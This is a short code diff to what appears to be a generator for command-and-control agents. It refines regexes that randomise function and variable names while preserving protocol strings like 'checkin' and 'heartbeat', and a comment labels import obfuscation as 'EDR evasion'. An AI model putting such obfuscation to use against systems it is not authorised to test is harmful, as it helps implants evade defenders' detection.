@@ -240,7 +240,9 @@ class AgentGenerator:
         }
 
         # Build combined regex for function names (single pass)
-        func_pattern = re.compile(r'\b(' + '|'.join(re.escape(k) for k in func_mappings) + r')\b')
+        # Exclude matches inside string literals to avoid corrupting protocol type values
+        # e.g. 'checkin' and 'heartbeat' must stay as string literals for the server protocol
+        func_pattern = re.compile(r"(?<!['\"])\b(" + '|'.join(re.escape(k) for k in func_mappings) + r")\b(?!['\"])")
         content = func_pattern.sub(lambda m: func_mappings[m.group(0)], content)
 
         # Randomize variable names in key areas (combined into two passes)
@@ -253,7 +255,9 @@ class AgentGenerator:
             'decrypted': self.random_var_name(),
             'websocket': self.random_var_name(),
         }
-        var_pattern = re.compile(r'\b(' + '|'.join(re.escape(k) for k in var_replacements) + r')\b(?=\s*[=:]|[\s\.])')
+        # Exclude matches inside string literals to preserve dict keys like 'command', 'output'
+        # while still renaming all code-level variable references (args, subscripts, etc.)
+        var_pattern = re.compile(r"(?<!['\"])\b(" + '|'.join(re.escape(k) for k in var_replacements) + r")\b(?!['\"])")
         content = var_pattern.sub(lambda m: var_replacements[m.group(1)], content)
 
         # Obfuscate import names (EDR evasion)
